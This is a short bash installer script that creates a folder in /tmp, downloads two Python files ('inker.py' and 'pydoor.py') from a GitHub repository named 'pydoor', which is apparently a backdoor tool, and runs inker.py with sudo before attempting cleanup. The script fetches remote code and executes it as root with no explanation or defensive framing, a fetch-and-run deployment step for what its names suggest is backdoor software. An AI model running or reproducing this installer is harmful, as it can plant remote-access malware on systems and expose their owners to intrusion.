#!/bin/bash

cd /tmp
mkdir pydoor
cd pydoor
echo "Downloading inker"
curl https://raw.githubusercontent.com/x41lakazam/pydoor/master/client/inker.py -O
echo "Downloading pydoor"
curl https://raw.githubusercontent.com/x41lakazam/pydoor/master/client/pydoor.py -O
echo "Running inker"
sudo python inker.py
echo "Success"
cd /tmp
rm pydoor

